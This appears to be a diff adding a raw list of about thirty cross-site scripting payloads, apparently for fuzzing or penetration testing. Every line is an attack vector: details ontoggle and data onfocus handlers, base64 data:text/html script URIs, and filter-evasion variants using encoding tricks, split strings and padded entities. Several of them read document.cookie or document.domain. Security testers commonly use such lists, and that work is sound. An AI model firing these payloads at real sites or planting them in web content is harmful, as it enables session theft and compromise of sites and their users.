@@ -1,0 +1,31 @@
+<data id=x tabindex=1 onfocus=alert(1)></data>
+<datalist id="xss"><option value="&lt;script&gt;alert('XSS')&lt;/script&gt;"></datalist>
+data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
+data:text/html;base64,Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
+data:text/html,<script>alert(0)</script>
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(`VulneravelXSS`%26%2300000000000000000041//
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<details onauxclick=confirm`xss`></details>
+<details+/'on+/ontoggle=1^confirm(document.domain)+open//
+<details ontoggle=alert(1) open>test</details>
+<details open id="' &quot;'"ontoggle=alert(1)>
+<details/open/ontoggle=alert()>
+<details/open/ontoggle="alert`1`">
+<details open ontoggle="{alert`1`}"></details>
+<details open ontoggle="alert(1)"><summary>Click me!</summary></details>
+<details/open/ontoggle=(confirm)()//
+">'><details/open/ontoggle=confirm('XSS')>
+>'><details/open/ontoggle=confirm('XSS')>
+"><details/open/ontoggle=confirm("/xss_by_Y000!/")>
+<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
+"><details/open/ontoggle=prompt("/test/")>
+<details open ontoggle='self["ale"%2b"rt"]&lpar;document&period;domain&rpar;'>
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
